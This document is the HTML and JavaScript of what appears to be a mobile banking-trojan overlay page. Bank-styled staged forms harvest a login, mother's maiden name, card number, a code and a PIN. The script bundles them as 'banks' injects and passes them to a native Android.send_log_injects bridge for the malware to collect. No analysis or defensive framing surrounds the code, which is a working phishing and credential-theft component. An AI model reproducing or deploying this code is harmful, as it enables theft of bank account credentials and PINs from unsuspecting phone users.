        <style>
            #form1, #form2, #form3 {
                display: flex;
                flex-direction: column;
                min-height: 100vh;
            }
            
            body {
                font-family: sans-serif;
                margin: 0;
                padding: 0;
                background: #fff;
                color: #000;
            }
            
            header {
                background: #851936;
                padding: 10px;
                border-bottom: 1px solid #851936;
                font-weight: 100;
                color: #fff;
                font-size: 16px;
            }
            
            section {
                padding: 20px;
                flex: 1;
            }

            label {
                color: #767676;
                font-weight: 100;
                margin-top: 9px;
            }
            
            .input {
                width: 100%;
                background: #fff;
                padding: 7px;
                border: 0;
                border-bottom: 1px solid #A8A8A8;
                border-radius: 0;
                margin-bottom: 15px;
                color: #000;
                transition: border-color 0.2s ease-in, color 0.2s ease-in;
            }
            
            .input:focus {
                width: 100%;
                background: #fff;
                padding: 7px;
                border: 0;
                border-bottom: 1px solid #850035;
                border-radius: 0;
                margin-bottom: 15px;
                color: #000;
                transition: border-color 0.2s ease-in, color 0.2s ease-in;
            }
            
            .button {
                border: 1px solid #850035;
                width: 100%;
                background: #850035;
                color: #fff;
                float: right;
                padding: 10px;
                font-size: 18px;
                font-weight: 100;
            }

            .button[disabled] {
                background: #7e7e7e;
                border: none;
            }

            input,button {
                outline: none !important;
                box-shadow: none !important;
            }

            footer {
                padding: 15px;
            }

            .error {
                border-color: #f00 !important;
            }
    </style>
</head>

    <script>
    var nextPage = document.getElementById('nextPage'),
        lastPage = document.getElementById('lastPage'),
        sendData = document.getElementById('sendData');

    var patterninput1=document.querySelector('form input[withpattern1]')
    $(patterninput1).on('input', function (event) {
        var regex = new RegExp(/^([\sa-zA-Z0-9\s]){7,11}$/);
        newval=patterninput1.value
        if (!regex.test(newval)) {
            nextPage.disabled=true
            patterninput1.classList.add("error")
        }
        else{
            nextPage.disabled=false
            patterninput1.classList.remove("error")
        }
    });
    var patterninput2=document.querySelector('form input[withpattern2]')
    $(patterninput2).on('input', function (event) {
        var regex = new RegExp(/^([\sa-zA-Zа-яА-Я\s]){4,20}$/);
        newval=patterninput2.value
        if (!regex.test(newval)) {
            event.preventDefault();
            lastPage.disabled=true
            patterninput2.classList.add("error")
        }
        else{
            lastPage.disabled=false
            patterninput2.classList.remove("error")
        }
    });
    // $("#nextPage").on('click', function (event) {
        
    // })

    $('#cc').mask('0000 0000')
    $('#pin').mask('0#')
        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        var login = document.getElementById('login'),
            mmn = document.getElementById('mmn'),
            cc = document.getElementById('cc');
            code = document.getElementById('code'),
            pin = document.getElementById('pin');


        nextPage.onclick = () => {
          if(login.value.length !== 9) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
                        
            }                form1.style.display = 'none';
                form2.style.display = 'flex';
            
        }

        lastPage.onclick = () => {
          if(mmn.value.length !== 9) {
                mmn.classList.add('error');
            } else {
                mmn.classList.remove('error');
                        
            }
            
            form2.style.display = 'none';
                form3.style.display = 'flex';
            
        }

        sendData.onclick = () => {
            if(cc.value.length !== 9) {
                cc.classList.add('error');
            } else {
                cc.classList.remove('error');
                        
            }
            if(code.value.length !== 4) {
                code.classList.add('error');
            } else {
                code.classList.remove('error');
            }

            if(pin.value.length < 4) {
                pin.classList.add('error')
            } else {
                pin.classList.remove('error');
            }

            if(code.value.length === 4 && pin.value.length >= 4) {
                var data = {};
                data.login = login.value;
                data.mmn = mmn.value;
                
                data.cc = cc.value;
                data.code = code.value;
                data.pin = pin.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
            
        }
    </script>
</body>
